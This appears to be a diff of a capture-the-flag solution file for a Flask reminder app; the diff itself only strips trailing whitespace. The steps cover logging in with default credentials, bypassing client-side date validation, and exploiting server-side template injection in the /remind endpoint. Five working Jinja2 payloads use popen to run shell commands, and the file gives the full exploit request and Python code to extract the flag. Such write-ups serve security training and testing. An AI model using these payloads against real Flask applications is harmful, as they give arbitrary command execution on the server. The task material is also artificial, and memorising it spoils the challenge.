@@ -20,12 +20,12 @@ tricks:
       # py line 102-111:
       # @route('/remind', methods=['GET'])
       # @login_required
-      # def remind(): 
+      # def remind():
       #     date = request.args.get('date')
       #     message = 'Reminder will be sent on {}'.format(date)
       #     tmpl=render_template_string(message,date=date)
       #     return render_template('reminder.html', message=tmpl)
-      # 
+      #
       # Vulnerability: date parameter from URL directly inserted into template string
       # No sanitization before render_template_string()
       # User input can contain Jinja2 template syntax
@@ -37,7 +37,7 @@ tricks:
       POST /login
       Content-Type: application/x-www-form-urlencoded
       username=user&password=user
-      
+
       # Default credentials created in py line 41-44:
       # if not User.query.filter_by(username='user').first():
       #     user = User(username='user', password='user')
@@ -52,12 +52,12 @@ tricks:
       # if (!dateInput.match(/^\d{4}-\d{2}-\d{2}$/)) {
       #     alert('Invalid date format. Please use YYYY-MM-DD.');
       # }
-      # 
+      #
       # Bypass methods:
       # 1. Directly access /remind?date=<payload> (bypasses JavaScript)
       # 2. Disable JavaScript in browser
       # 3. Use curl or other HTTP client
-      # 
+      #
       # Client-side validation can always be bypassed
 
   - name: "Step 4: Craft SSTI payload"
@@ -66,22 +66,22 @@ tricks:
     payload: |
       # Flag location: /app/flag.txt (created at app startup, py line 121)
       # Flag format: FLAG{<sha256_hash>}
-      # 
+      #
       # Method 1: Using config to access os module
       {{ config.__class__.__init__.__globals__['os'].popen('cat /app/flag.txt').read() }}
-      
+
       # Method 2: Using request object
       {{ request.__class__._load_form_data.__globals__['os'].popen('cat /app/flag.txt').read() }}
-      
+
       # Method 3: Using lipsum (Flask global)
       {{ lipsum.__globals__['os'].popen('cat /app/flag.txt').read() }}
-      
+
       # Method 4: Using cycler
       {{ cycler.__init__.__globals__['os'].popen('cat /app/flag.txt').read() }}
-      
+
       # Method 5: Using __builtins__
       {{ self.__init__.__globals__.__builtins__['__import__']('os').popen('cat /app/flag.txt').read() }}
-      
+
       # Note: All methods access os module through Flask/Jinja2 globals
       # Then use popen() to execute shell commands
 
@@ -92,24 +92,24 @@ tricks:
       # Send request:
       GET /remind?date={{ config.__class__.__init__.__globals__['os'].popen('cat /app/flag.txt').read() }}
       Cookie: session=<session_cookie>
-      
+
       # Response structure:
       # <div class="alert alert-info">
-      #     <p> 
+      #     <p>
       #     Reminder will be sent on <FLAG_CONTENT>
       #     </p>
       # </div>
-      # 
+      #
       # Important: Output is HTML escaped by Jinja2
       # Flag may appear as HTML entities (e.g., &lt; instead of <)
       # Need to decode HTML entities to extract flag
-      # 
+      #
       # Extraction method:
       # 1. Find "Reminder will be sent on" in response
       # 2. Extract content after this text
       # 3. Use html.unescape() to decode HTML entities
       # 4. Search for FLAG{...} pattern in decoded content
-      # 
+      #
       # Example Python extraction:
       # import html
       # import re
@@ -119,4 +119,3 @@ tricks:
       #     flag_match = re.search(r'FLAG\{[^}]+\}', content, re.IGNORECASE)
       #     if flag_match:
       #         flag = flag_match.group(0)
-
